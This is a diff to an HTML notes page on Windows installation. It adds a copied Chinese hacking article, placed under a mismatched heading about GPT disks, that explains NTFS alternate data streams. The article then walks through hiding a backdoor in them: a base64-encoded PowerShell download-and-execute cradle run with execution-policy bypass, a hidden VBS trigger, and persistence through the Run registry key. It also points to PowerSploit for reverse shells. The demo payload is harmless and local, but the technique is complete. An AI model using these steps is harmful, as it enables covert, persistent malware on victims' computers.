@@ -52,6 +52,9 @@
 				padding-left : 2em;
 				line-height : 180%;
 			}
+			.class___copy_other_people_content {
+				background-color : #aef5a8;
+			}
 		</style>
 		<script>
 		</script>
@@ -280,6 +283,108 @@
 					创建主分区，这里要注意数字按M计算，50000就是分区大小为50000M，可以根据自己实际情况调整
 					<br/>
 					<span class="shell_instruction">create partition primary size=50000</span>
+				</div>
+			</section>
+			<section>
+				<h3>install windows use EFI need GPT partion disk, use diskpart to convert harddisk to GPT format</h3>
+				<div class="class___copy_other_people_content">
+					<h2 class="arttitle">
+						<a target="_blank" title="Permanent Link to 一个用ADS（供选数据流）隐藏Windows后门的方法" href="http://www.hackdig.com/07/hack-24579.htm">一个用ADS（供选数据流）隐藏Windows后门的方法</a>
+					</h2>
+					<div id="content">
+						<p style="margin-top: 15px;">
+							<span style="color: rgb(0, 0, 0); font-size: 18px;"><strong>1 引言</strong></span>
+						</p>
+						<p>
+							隐藏windows病毒文件有很多方法，比如伪装成一个系统文件，或者取一个与系统文件很像的文件名例如svch0st.exe并且将其放在system32目录下。或者hook一些api并拦截其显示功能。这里介绍另一种方法，把一个后门隐藏在ADS (供选数据流/ alternate data stream)里面。请注意从win XP以后，微软已经禁止用户从ADS里直接执行程序，最近从Enigma0x3学到一个新的方法可以绕过这个限制。而且这个方法并不需要admin权限。
+						</p>
+						<p style="margin-top: 15px;">
+							<span style="color: rgb(0, 0, 0); font-size: 18px;"><strong>2 ADS (供选数据流/ alternate data stream)</strong></span>
+						</p>
+						<p>
+							NTFS使用Master File Table (MFT) 来管理文件。windows系统中的每个文件都对应一个MFT记录。而每一个MFT记录由若干个属性(attribute)组成，用来描述该文件的具体信息。比如 $FILE_NAME 属性描述了该文件的文件名和创建修改访问时间，而$DATA属性包含了该文件的具体内容。
+						</p>
+						<p>
+							举个例子，我现在有一个文本文件，名称为test.txt，文本内容为”Hello, world!”。
+						</p>
+						<p><br></p>
+						<p style="text-align: center;">
+							<img src="./refs/ADS/img_01.jpg" style="float:none" title="1"/>
+						</p>
+						<p><br></p>
+						<p><br></p>
+						<p>
+							其MFT记录结构如图，$FILE_NAME属性包含了该文件名test.txt。 $DATA属性则包含了内容 “Hello, world!”。这里说个题外话，由于该内容长度小于1kb，所以文件的内容就直接存储在MFT记录里面了（称为resident）。如果内容长度大于1kb，文件内容会被存储在别的地方 （称为non-resident），在这种情况下$DATA属性只包含其存储地址。这里“Hello, world!”很短，所以直接保存在了MFT记录里面。</p><p>很多人想当然的认为一个文件只能有一个$DATA属性，这是错误的。在NTFS中，一个文件可以有多个$DATA属性。比如我现在想给test.txt加入一个名为ThisIsAnADS的$DATA属性：
+						</p>
+						<pre>c:\test&gt;echo&nbsp;Hello,&nbsp;freebuf!&nbsp;&gt;&nbsp;test.txt:ThisIsAnADS</pre>
+						<p>
+							那么，该文件的MFT记录就变成了下图所示
+						</p>
+						<p style="text-align: center;">
+							<img src="./refs/ADS/img_02.jpg" title="2.jpg"/>
+						</p>
+						<p>
+							你可能发现了这两个$DATA属性还是略有不同的，第一个没有名称，而第二个有名称（ThisIsAnADS）！通常人们称第一个为主数据流（primary data stream ）。主数据流在文件创建的同时就被创建了，并且默认没有名称，所以也叫做未名数据流 （unnamed data stream）。第二个是我们后来创建的，并且赋予了名称（ThisIsAnADS）。这个就是供选数据流 （alternate data stream，ADS）。绝大多数用户只会和主数据流打交道，从某种意义上来说，ADS对用户是隐藏的。用常规的dir命令和windows文件管理器都没法发现ADS。而当我们查看文件内容的时候也仅仅显示主数据流的内容。
+						</p>
+						<pre>c:\test&gt;dir&nbsp;test.txt<br>Volume&nbsp;in&nbsp;drive&nbsp;C&nbsp;is&nbsp;OS<br>Volume&nbsp;Serial&nbsp;Number&nbsp;is&nbsp;F467-BAF0<br>&nbsp;<br>Directory&nbsp;of&nbsp;c:\test<br>&nbsp;<br>2015-07-26&nbsp;&nbsp;10:29&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;13&nbsp;test.txt<br>1&nbsp;File(s)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;13&nbsp;bytes<br>0&nbsp;Dir(s)&nbsp;&nbsp;42&nbsp;991&nbsp;456&nbsp;256&nbsp;bytes&nbsp;free<br>&nbsp;<br>c:\test&gt;type&nbsp;test.txt<br>Hello,&nbsp;world!</pre>
+						<p>
+							看！dir和type命令只显示了主数据流的长度和内容。但是我们可以使用dir /r 命令来列出ADS
+						</p>
+						<pre>c:\test&gt;dir&nbsp;/r&nbsp;test.txt<br>Volume&nbsp;in&nbsp;drive&nbsp;C&nbsp;is&nbsp;OS<br>Volume&nbsp;Serial&nbsp;Number&nbsp;is&nbsp;F467-BAF0<br>&nbsp;<br>Directory&nbsp;of&nbsp;c:\test<br>&nbsp;<br>2015-07-26&nbsp;&nbsp;10:29&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;13&nbsp;test.txt<br>18&nbsp;test.txt:ThisIsAnADS:$DATA<br>1&nbsp;File(s)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;13&nbsp;bytes<br>0&nbsp;Dir(s)&nbsp;&nbsp;42&nbsp;991&nbsp;382&nbsp;528&nbsp;bytes&nbsp;free</pre><p>我们也可以用powershell命令Get-Content来查看ADS的内容</p><pre>PS&nbsp;C:\test&gt;&nbsp;Get-Content&nbsp;test.txt&nbsp;-stream&nbsp;ThisIsAnADS<br>Hello,&nbsp;freebuf!<br>PS&nbsp;C:\test&gt;</pre>
+						<p>
+							也许你会问，那ADS到底有什么作用哪？在实际应用中，操作系统和某些应用程序会用ADS来标记和分类文件，比如某些杀毒软件会用ADS来标记哪些文件已经被检查过了（也许我们可以自己设置ADS的内容来避免被查杀？）。IE还会用ADS来标记那些从Internet下载下来的文件。正好我刚下载了一个netcat， 查看一下nc.exe
+						</p>
+						<pre>c:\test&gt;dir&nbsp;/r&nbsp;nc.exe<br>Volume&nbsp;in&nbsp;drive&nbsp;C&nbsp;is&nbsp;OS<br>Volume&nbsp;Serial&nbsp;Number&nbsp;is&nbsp;F467-BAF0<br>&nbsp;<br>Directory&nbsp;of&nbsp;c:\test<br>&nbsp;<br>2011-09-17&nbsp;&nbsp;00:52&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;38&nbsp;616&nbsp;nc.exe<br>26&nbsp;nc.exe:Zone.Identifier:$DATA<br>1&nbsp;File(s)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;38&nbsp;616&nbsp;bytes<br>0&nbsp;Dir(s)&nbsp;&nbsp;30&nbsp;734&nbsp;065&nbsp;664&nbsp;bytes&nbsp;free</pre>
+						<p>有一个名为Zone.Identifier的ADS! 查看一下它的内容：</p>
+						<pre>PS&nbsp;C:\test&gt;&nbsp;Get-Content&nbsp;nc.exe&nbsp;-stream&nbsp;Zone.Identifier<br>[ZoneTransfer]<br>ZoneId=3<br>PS&nbsp;C:\test&gt;</pre>
+						<p>ZoneID=3表示这个文件来自Internet Zone。所以每次运行nc.exe，系统知道这个文件来自Internet，然后就会弹出一个警告</p>
+						<p style="text-align: center;">
+							<img src="./refs/ADS/img_03.jpg" title="nc.JPG"/>
+						</p>
+						<p style="margin-top: 15px;">
+							<span style="color: rgb(0, 0, 0); font-size: 18px;"><strong>3 用ADS隐藏后门</strong></span>
+						</p>
+						<p>
+							既然ADS不被大多数用户所知，而且常规的系统命令和文件管理器都检查不到其存在，那么我们可以把后门放在ADS以起到隐藏的目的。让我们先试着把netcat的二进制内容存到test.txt的一个叫nc.exe的ADS里面
+						</p>
+						<pre>c:\test&gt;type&nbsp;nc.exe&nbsp;&gt;&nbsp;test.txt:nc.exe<br>&nbsp;<br>c:\test&gt;dir&nbsp;/r&nbsp;test.txt<br>Volume&nbsp;in&nbsp;drive&nbsp;C&nbsp;is&nbsp;OS<br>Volume&nbsp;Serial&nbsp;Number&nbsp;is&nbsp;F467-BAF0<br>&nbsp;<br>Directory&nbsp;of&nbsp;c:\test<br>&nbsp;<br>2015-07-26&nbsp;&nbsp;11:19&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;13&nbsp;test.txt<br>38&nbsp;616&nbsp;test.txt:nc.exe:$DATA<br>18&nbsp;test.txt:ThisIsAnADS:$DATA<br>1&nbsp;File(s)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;13&nbsp;bytes<br>0&nbsp;Dir(s)&nbsp;&nbsp;42&nbsp;990&nbsp;366&nbsp;720&nbsp;bytes&nbsp;free</pre>
+						<p>可以写入，没有问题。试着执行之</p>
+						<pre>c:\test&gt;start&nbsp;test.txt:nc.exe<br>Access&nbsp;is&nbsp;denied.</pre>
+						<p>但是执行不成功。。。因为从windows xp以后微软就禁止用户从ADS里执行程序了。写入，读出操作都可以，但是不允许执行。</p>
+						<p>
+							换一个思路，既然允许写和读，那么我们可以在ADS里面写入脚本，然后用脚本解释器(Wscript.exe)来运行该脚本。Wscript.exe默认支持js, vbs等，但是我更偏爱powershell的简单高效。所以准备在一个文件中写入2个ADS，一个包含powershell脚本后门，用于从网上下载和执行恶意脚本。一个包含VBS脚本，用于触发powershell脚本。具体设计如下图，包括3部分
+						</p>
+						<p style="text-align: center;">
+							<img src="./refs/ADS/img_04.jpg" title="3.jpg"/>
+						</p>
+						<p>
+							<span style="color: rgb(0, 112, 192);">
+								<strong>1. 恶意脚本</strong>：
+							</span>
+							一个提供真正的恶意功能的powershell脚本，比如反弹cmd shell等等，具体如何用powershell实现远控功能，请参照https://github.com/mattifestation/PowerSploit。 这里为了演示的目的，我们的”恶意脚本”只会弹出一个对话框，显示”Infected”。该文件名为malware.ps1，存放于 http://127.0.0.1:8123/malware.ps1
+						</p>
+						<p>
+							<span style="color: rgb(0, 112, 192);"><strong>2. 下载器</strong>：</span>
+							该下载器也是一段powershell脚本，用来下载并执行恶意脚本。其实就一句话 "IEX ((New-Object Net.WebClient).DownloadString(&amp;#039;http://127.0.0.1:8123/malware.ps1&amp;#039;));" 我们把它base64编码[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("IEX ((New-Object Net.WebClient).DownloadString(&amp;#039;http://127.0.0.1:8123/malware.ps1&amp;#039;));"))得到base64编码结果。然后把 powershell.exe -ep Bypass -noexit -enc [base64编码结果] 写入test.txt:1
+						</p>
+						<p>
+							<span style="color: rgb(0, 112, 192);"><strong>3. 触发器</strong>：</span>
+							该触发器是一段VB脚本，会开一个cmd运行test.txt:1 里的脚本。由于我们要用wscript.exe 来运行这个ADS, 而wscript.exe会检查脚本文件的后缀名，所以这个ADS的命名必须以.vbs结尾。 具体内容为 Dim objShell:Set objShell = WScript.CreateObject("WScript.Shell"):command = "cmd /C for /f ""delims=,"" %i in (C:\\test\\test.txt:1) do %i":objShell.Run command, 0:Set objShell = Nothing，将其写入test.txt:2.vbs
+						</p>
+						<p style="text-align: center;">
+							<img src="./refs/ADS/img_05.jpg" title="script.JPG"/>
+						</p>
+						<p>用wscript.exe运行一下，成功！进程管理器显示该进程名为powershell.exe</p>
+						<p style="text-align: center;">
+							<img src="./refs/ADS/img_06.jpg" title="result.JPG"/>
+						</p>
+						<p>
+							当然，还可以把wscript.exe test.txt:2.vbs 放在注册表与自动启动相关的键值里，比如HKCU\Software\Microsoft\Windows\CurrentVersion\Run 等，以实现开机自启动。
+						</p>
+						<p>
+							在这个例子里，我们把ADS加在了一个文本文件(test.txt)上。其实在NTFS中，目录和文件的MFT记录结构是一样的。所以我们也可以把ADS加在目录上，比如$env:UserProfile\AppData 。
+						</p>
+					</div>
 				</div>
 			</section>
 		</article>
